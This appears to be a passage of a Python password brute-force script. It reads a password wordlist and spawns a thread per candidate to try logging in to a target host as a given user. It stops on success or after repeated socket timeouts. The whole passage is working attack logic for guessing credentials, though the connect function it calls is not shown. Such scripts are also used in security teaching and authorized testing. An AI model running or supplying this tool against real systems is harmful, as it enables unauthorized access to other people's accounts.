# Open the password file in read mode
with open(passwd_file) as file:
    # Iterate over each line in the file
    for line in file.readlines():
        # Check if the password has been found
        if Found:
            # Print a message and exit if the password is found
            print("[*] Exiting: Password Found")
            exit(0)
        # Check if the number of failed attempts is greater than 5
        if Fails > 5:
            # Print a message and exit if there are too many socket timeouts
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        # Acquire the connection lock
        connection_lock.acquire()
        # Strip any carriage return and newline characters from the line
        password = line.strip('\r').strip('\n')
        # Print the password being tested
        print("[-] Testing: " + str(password))
        # Create a new thread to attempt the connection with the current password
        t = threading.Thread(target=connect, args=(host, user, password))
        # Start the thread
        t.start()

# Check if the script is being run directly
if __name__ == '__main__':
    # Call the main function
    main()
